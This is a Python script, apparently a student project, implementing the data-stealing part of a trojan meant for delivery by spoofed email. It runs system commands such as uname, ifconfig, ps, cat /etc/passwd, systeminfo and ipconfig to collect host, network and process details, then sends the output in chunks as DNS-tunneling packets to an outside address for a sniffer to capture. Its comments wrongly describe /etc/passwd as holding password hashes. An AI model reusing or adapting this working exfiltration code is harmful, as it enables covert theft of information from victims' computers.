"""
this file contains the implementation for trojan file that will be sent over spoofed e-mail.

the trojan will open a legit file that the target will read (`.pdf`, `.jpeg`, etc...).
while reading, the malicious script will get to work, extracting useful information from the target PC,
extracts data such as network configuration info, OS info, languages, password hashes.

** the usage of that script undercover of potential legitimate file is optional,
we did not created such trojan because of the simple reason that nowdays every simple
antivirus software recognizes the format and fully blocking the file, so to success in trojan creating
you should have proper knowledge about malware creating **

after data is collected, it will be sent over DNS packets (DNS-Tunneling method),
and will be sniffed and collected by us.

:authors: Lior Vinman & Yoad Tamar

:since: 19/06/2023
"""

import scapy.all as scapy
import subprocess
import platform
import random


def segment_buffer(buffer: str, chunk_size: int = 1024) -> list[str]:
    """
    this function makes a segmentation in length of 1KB of given string.

    method is must have, because UDP max packet size is 65536, and the pure size of
    the payload is up to ~1450, we'll make the segments in length 1024.

    :param buffer: buffer to segment
    :param chunk_size: size of each segment

    :return: list of created segments
    """

    # number of chucks
    num_chunks = (len(buffer) + chunk_size - 1) // chunk_size

    # list of chunks
    chunks = []

    for i in range(num_chunks):

        # selecting start index
        start = i * chunk_size

        # selecting end index
        end = start + chunk_size

        # getting the segmentation
        chunk = buffer[start:end]

        # appending current chunk
        chunks.append(chunk)

    return chunks


def get_data() -> list[str]:
    """
    this function collects the data that should be leaked from system,
    executing system (terminal - linux /CMD - windows) commands.

    :return: list of outputs of executed system commands
    """

    data: list[str] = []

    if platform.system() == "Linux":

        # username on machine
        data.append(subprocess.check_output(["whoami"]).decode())

        # group name on machine
        data.append(subprocess.check_output(["hostname"]).decode())

        # kernel info
        data.append(subprocess.check_output(["uname", "-a"]).decode())

        # keyboard layouts ("languages")
        data.append(subprocess.check_output(["setxkbmap", "-query"]).decode())

        # network info
        data.append(subprocess.check_output(["ifconfig", "-a"]).decode())

        # processes info
        data.append(subprocess.check_output(["ps", "-a"]).decode())

        # password hashes file
        data.append(subprocess.check_output(["cat", "/etc/passwd"]).decode())

    elif platform.system() == "Windows":

        # system information
        data.append(subprocess.check_output(["systeminfo"]).decode("latin"))

        # installed drivers
        data.append(subprocess.check_output(["driverquery"]).decode("latin"))

        # system version
        data.append(subprocess.check_output("ver", shell=True).decode("latin"))

        # network info
        data.append(subprocess.check_output(["ipconfig", "/all"]).decode("latin"))

        # processes info
        data.append(subprocess.check_output(["tasklist"]).decode("latin"))

    return data


if __name__ == "__main__":

    # list full of data to leak from system using DNS-Tunneling
    leak_data: list[str] = get_data()

    # Internet Protocol header (Network)
    ip_hdr = scapy.IP(dst="1.2.3.4")

    # User Datagram Protocol header (Transport)
    udp_hdr = scapy.UDP(sport=(random.randint(1025, 65535)), dport=53)

    # DNS packet transaction-id
    txid = 0x000

    for i in leak_data:

        # segmenting the data into chunks
        segmentation = segment_buffer(i)

        for j in segmentation:

            # Domain Name System header (Application)
            dns_hdr = scapy.DNS(qd=scapy.DNSQR(qname=""), id=txid)

            # Payload (raw data)
            raw_hdr = scapy.Raw(load=j)

            # constructing the packet
            tunneling = ip_hdr / udp_hdr / dns_hdr / raw_hdr

            # sending the packet
            scapy.send(tunneling, verbose=False)

            # increasing sequence id
            txid += 1

        # After sending real data segments, we are breaking between commands with placeholder packet
        # the packet here contains request for `example.com` and `None` payload, just for cut the segments sequence,
        # so we could know that command output ended and print it well using our sniffer

        dns_hdr = scapy.DNS(qd=scapy.DNSQR(qname="example.com"), id=txid)

        raw_hdr = scapy.Raw(load="None")

        tunneling = ip_hdr / udp_hdr / dns_hdr / raw_hdr

        scapy.send(tunneling, verbose=False)
